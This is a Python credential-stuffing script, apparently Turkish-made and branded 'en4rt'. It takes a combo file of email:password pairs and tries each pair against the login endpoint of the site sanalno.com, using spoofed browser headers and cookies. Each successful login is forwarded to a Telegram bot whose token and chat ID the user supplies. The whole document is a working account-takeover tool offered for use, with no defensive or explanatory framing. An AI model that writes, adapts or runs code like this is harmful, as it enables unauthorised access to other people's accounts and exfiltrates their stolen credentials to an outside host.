import requests
import json
import time
import random
import os
from cfonts import render

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

token = input(" - Token Gir: ")
id = input(" - İd Gir: ")
EnartCombo = input(" - Combo gir: ")
os.system('clear')

print("\n\n")
kopmk = render('en4rt', colors=['white', 'red'], align='center')
print(kopmk)
print("━" * 55) 

with open(EnartCombo, 'r') as file:
    for line in file:
        try:
            mail, pas = line.strip().split(':')
            
            enrt = requests.get('https://sanalno.com', headers= {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    })
    
            sesion = enrt.cookies.get_dict().get("ci_session")

            
            data = {
            'email': mail,
            'password': pas,
            }
            
            response = requests.post('https://sanalno.com/ajax/login', cookies= {
    'ci_session': sesion,
    '_gcl_au': '1.1.2107333247.1750583031',
    '_ga_1KZQZ3W60Y': 'GS2.1.s1750583031$o1$g0$t1750583031$j60$l0$h778101158',
    '_ga': 'GA1.1.581934708.1750583032',
}, headers= {
    'authority': 'sanalno.com',
    'accept': '*/*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://sanalno.com',
    'referer': 'https://sanalno.com/login',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}, data=data)
            
            try:
                json = response.json()
                if json.get('success') is True:
                    print(f"Başarılı giriş ✅ {mail}:{pas}")
                    print("━" * 55)
                    mesaj = f"- SanalNo Başarılı Giriş -\n📧Mail: {mail}\n🔑Password: {pas}"
                    gonder = f"https://api.telegram.org/bot{token}/sendMessage"
                    
                    msj = {
                    "chat_id": id,
                    "text": mesaj
                    }
                    requests.post(gonder, data=msj)
                    
                else:
                    print(f"Başarısız giriş ❌ {mail}:{pas}")
                    print("━" * 55)
                    
            except json.JSONDecodeError:
                print(f"Hata: {response.text}")
                

        except Exception as e:
            print(f"Hata: {e}")
